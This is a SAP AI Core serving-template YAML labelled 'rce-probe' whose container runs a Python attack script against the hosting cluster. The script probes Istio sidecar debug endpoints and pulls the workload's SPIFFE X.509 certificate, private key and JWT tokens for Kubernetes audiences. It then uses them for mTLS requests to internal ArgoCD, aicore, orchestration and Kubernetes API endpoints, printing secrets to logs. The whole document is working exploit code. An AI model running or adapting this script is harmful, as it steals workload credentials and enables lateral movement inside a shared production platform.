apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe
  labels:
    scenarios.ai.sap.com/id: "rce-probe"
    ai.sap.com/version: "4.1.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/description: "spiffe-svid-mtls-xds-probe"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            python3 -c "
            import os, socket, ssl, sys, subprocess, struct, tempfile, stat

            print('[PROBE_V41_START]', flush=True)

            # --- 1. Port 15020 path enumeration ---
            def http_get(host, port, path, timeout=4):
                try:
                    s = socket.socket()
                    s.settimeout(timeout)
                    s.connect((host, port))
                    s.sendall(f'GET {path} HTTP/1.0\r\nHost: {host}\r\n\r\n'.encode())
                    resp = b''
                    while True:
                        chunk = s.recv(4096)
                        if not chunk: break
                        resp += chunk
                        if len(resp) > 8000: break
                    s.close()
                    return resp.decode(errors='replace')
                except Exception as e:
                    return f'ERR:{e}'

            for path in ['/healthz/ready', '/ready', '/live', '/metrics',
                         '/debug/config_dump', '/debug/pprof/', '/debug/pprof/heap',
                         '/debug/ndsz', '/debug/sync', '/app-health/kserve-container/livez',
                         '/stats/prometheus', '/server_info', '/quitquitquit']:
                resp = http_get('127.0.0.1', 15020, path)
                tag = 'HIT' if 'ERR:' not in resp and '404' not in resp else 'MISS'
                print(f'[15020:{tag}:{path}] {resp[:300]}', flush=True)

            # --- 2. SPIFFE socket stat + XDS socket stat ---
            for sock_path in ['/var/run/secrets/workload-spiffe-uds/socket',
                               '/etc/istio/proxy/XDS']:
                try:
                    st = os.stat(sock_path)
                    mode = oct(stat.S_IMODE(st.st_mode))
                    print(f'[SOCK_STAT:{sock_path}] mode={mode} uid={st.st_uid} gid={st.st_gid}', flush=True)
                except Exception as e:
                    print(f'[SOCK_STAT_ERR:{sock_path}] {e}', flush=True)

            # --- 3. XDS socket: raw connection probe ---
            try:
                s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect('/etc/istio/proxy/XDS')
                # Send HTTP/2 preface to see if it's gRPC
                s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
                resp = s.recv(512)
                print('[XDS_SOCKET_RESP]', repr(resp[:200]), flush=True)
                s.close()
            except Exception as e:
                print('[XDS_SOCKET_ERR]', e, flush=True)

            # --- 4. Install grpcio + cryptography ---
            print('[PIP_INSTALL] starting...', flush=True)
            r = subprocess.run(
                [sys.executable, '-m', 'pip', 'install', '-q', '--no-cache-dir',
                 'grpcio==1.62.0', 'cryptography'],
                capture_output=True, timeout=120)
            if r.returncode != 0:
                print('[PIP_ERR]', r.stderr.decode()[:300], flush=True)
            else:
                print('[PIP_OK]', flush=True)

            # --- 5. SPIFFE Workload API: FetchX509SVID ---
            try:
                import grpc
                from cryptography import x509 as cx509
                from cryptography.hazmat.primitives.serialization import (
                    load_der_private_key, Encoding, PrivateFormat, NoEncryption)
                from cryptography.hazmat.backends import default_backend

                def read_varint(data, pos):
                    result, shift = 0, 0
                    while True:
                        b = data[pos]; pos += 1
                        result |= (b & 0x7F) << shift
                        if not (b & 0x80): break
                        shift += 7
                    return result, pos

                def pb_decode(data):
                    fields = {}
                    pos = 0
                    while pos < len(data):
                        try:
                            tag_wire, pos = read_varint(data, pos)
                        except: break
                        fn, wt = tag_wire >> 3, tag_wire & 7
                        if wt == 0:
                            v, pos = read_varint(data, pos)
                        elif wt == 2:
                            ln, pos = read_varint(data, pos)
                            v = data[pos:pos+ln]; pos += ln
                        elif wt == 1:
                            v = data[pos:pos+8]; pos += 8
                        elif wt == 5:
                            v = data[pos:pos+4]; pos += 4
                        else:
                            break
                        fields.setdefault(fn, []).append(v)
                    return fields

                def split_der_chain(der):
                    certs_pem = []
                    remaining = der
                    while remaining:
                        if len(remaining) < 4 or remaining[0] != 0x30: break
                        if remaining[1] & 0x80:
                            nb = remaining[1] & 0x7F
                            ln = int.from_bytes(remaining[2:2+nb], 'big')
                            total = 2 + nb + ln
                        else:
                            ln = remaining[1]
                            total = 2 + ln
                        cert_der = remaining[:total]
                        try:
                            cert = cx509.load_der_x509_certificate(cert_der, default_backend())
                            certs_pem.append(cert.public_bytes(Encoding.PEM))
                        except: break
                        remaining = remaining[total:]
                    return b''.join(certs_pem)

                print('[SPIFFE] connecting to workload API socket...', flush=True)
                chan = grpc.insecure_channel('unix:///var/run/secrets/workload-spiffe-uds/socket')
                fetch_x509 = chan.unary_stream(
                    '/spiffe.workload.SpiffeWorkloadAPI/FetchX509SVID',
                    request_serializer=lambda x: x,
                    response_deserializer=lambda x: x)

                metadata = [('workload.spiffe.io', 'true')]
                svid_cert_pem = None
                svid_key_pem = None
                svid_bundle_pem = None

                for raw_resp in fetch_x509(b'', metadata=metadata, timeout=8):
                    resp_fields = pb_decode(raw_resp)
                    for svid_bytes in resp_fields.get(1, []):
                        svid = pb_decode(svid_bytes)
                        spiffe_id = svid.get(1, [b''])[0].decode(errors='replace')
                        cert_der  = svid.get(2, [b''])[0]
                        key_der   = svid.get(3, [b''])[0]
                        bundle_der= svid.get(4, [b''])[0]

                        print(f'[SPIFFE_ID] {spiffe_id}', flush=True)
                        print(f'[SVID_SIZES] cert={len(cert_der)} key={len(key_der)} bundle={len(bundle_der)}', flush=True)

                        # Convert to PEM
                        svid_cert_pem = split_der_chain(cert_der)
                        if key_der:
                            priv = load_der_private_key(key_der, password=None, backend=default_backend())
                            svid_key_pem = priv.private_bytes(Encoding.PEM, PrivateFormat.PKCS8, NoEncryption())
                        svid_bundle_pem = split_der_chain(bundle_der)

                        # Print cert details
                        if svid_cert_pem:
                            cert = cx509.load_pem_x509_certificate(svid_cert_pem, default_backend())
                            print(f'[CERT_SUBJECT] {cert.subject}', flush=True)
                            print(f'[CERT_ISSUER]  {cert.issuer}', flush=True)
                            print(f'[CERT_VALIDITY] {cert.not_valid_before_utc} -> {cert.not_valid_after_utc}', flush=True)
                            try:
                                san = cert.extensions.get_extension_for_class(cx509.SubjectAlternativeName)
                                print(f'[CERT_SAN] {san.value.get_values_for_type(cx509.UniformResourceIdentifier)}', flush=True)
                            except: pass
                        break
                    break

                # --- 6. FetchJWTSVID for k8s API audience ---
                fetch_jwt = chan.unary_unary(
                    '/spiffe.workload.SpiffeWorkloadAPI/FetchJWTSVID',
                    request_serializer=lambda x: x,
                    response_deserializer=lambda x: x)

                for audience in ['kubernetes', 'https://kubernetes.default.svc.cluster.local',
                                  'api.sec-eu10.mlfprod.internal.live.k8s.ondemand.com']:
                    try:
                        # JWTSVIDRequest: audience field 1 (repeated string)
                        aud_bytes = audience.encode()
                        req_bytes = bytes([0x0A, len(aud_bytes)]) + aud_bytes
                        raw_jwt = fetch_jwt(req_bytes, metadata=metadata, timeout=5)
                        jwt_fields = pb_decode(raw_jwt)
                        for jwt_svid_bytes in jwt_fields.get(1, []):
                            jwt_svid = pb_decode(jwt_svid_bytes)
                            jwt_token = jwt_svid.get(2, [b''])[0].decode(errors='replace')
                            print(f'[JWT_SVID:{audience}] {jwt_token[:200]}', flush=True)
                    except Exception as e:
                        print(f'[JWT_ERR:{audience}] {e}', flush=True)

                # --- 7. mTLS connections using SVID cert+key ---
                if svid_cert_pem and svid_key_pem:
                    cf = tempfile.NamedTemporaryFile(delete=False, suffix='.pem', mode='wb')
                    cf.write(svid_cert_pem); cf.close()
                    kf = tempfile.NamedTemporaryFile(delete=False, suffix='.pem', mode='wb')
                    kf.write(svid_key_pem); kf.close()

                    def mtls_req(host, port, path='/', sni=None, http2=False, timeout=5):
                        try:
                            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                            ctx.check_hostname = False
                            ctx.verify_mode = ssl.CERT_NONE
                            ctx.load_cert_chain(cf.name, kf.name)
                            s = socket.socket()
                            s.settimeout(timeout)
                            ss = ctx.wrap_socket(s, server_hostname=sni or host)
                            ss.connect((host, port))
                            peer = ss.getpeercert(binary_form=True)
                            req = f'GET {path} HTTP/1.1\r\nHost: {sni or host}\r\nConnection: close\r\n\r\n'
                            ss.sendall(req.encode())
                            resp = b''
                            while True:
                                chunk = ss.recv(4096)
                                if not chunk: break
                                resp += chunk
                                if len(resp) > 8000: break
                            ss.close()
                            return 'OK', f'peer_cert_len={len(peer or b\"\")} | ' + resp.decode(errors='replace')[:400]
                        except Exception as e:
                            return 'ERR', str(e)[:150]

                    print('[MTLS_PROBE] starting with SVID cert...', flush=True)
                    # Known ClusterIPs and DNS targets
                    targets = [
                        # ArgoCD servers
                        ('100.104.210.229', 80,  '/api/v1/session', 'argocd-server.argocd-tenants.svc.cluster.local'),
                        ('100.104.210.229', 443, '/api/v1/session', 'argocd-server.argocd-tenants.svc.cluster.local'),
                        # aicore namespace services by DNS
                        ('aicore-api-server.aicore.svc.cluster.local', 80, '/', None),
                        ('ai-api-server.aicore.svc.cluster.local', 80, '/', None),
                        ('serving-service.aicore.svc.cluster.local', 80, '/', None),
                        ('execution-service.aicore.svc.cluster.local', 80, '/', None),
                        ('ml-tracking.aicore.svc.cluster.local', 80, '/', None),
                        ('user-management.aicore.svc.cluster.local', 80, '/', None),
                        # orchestration namespace
                        ('orchestration.orchestration.svc.cluster.local', 80, '/', None),
                        # k8s API with client cert
                        ('100.104.0.1', 443, '/version', 'kubernetes'),
                        ('api.sec-eu10.mlfprod.internal.live.k8s.ondemand.com', 443, '/version', None),
                    ]
                    for host, port, path, sni in targets:
                        status, body = mtls_req(host, port, path, sni)
                        print(f'[MTLS:{host}:{port}{path}] {status} | {body[:350]}', flush=True)

                    os.unlink(cf.name); os.unlink(kf.name)

            except Exception as e:
                import traceback
                print('[SPIFFE_OUTER_ERR]', traceback.format_exc()[:500], flush=True)

            print('[PROBE_V41_DONE]', flush=True)
            " 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
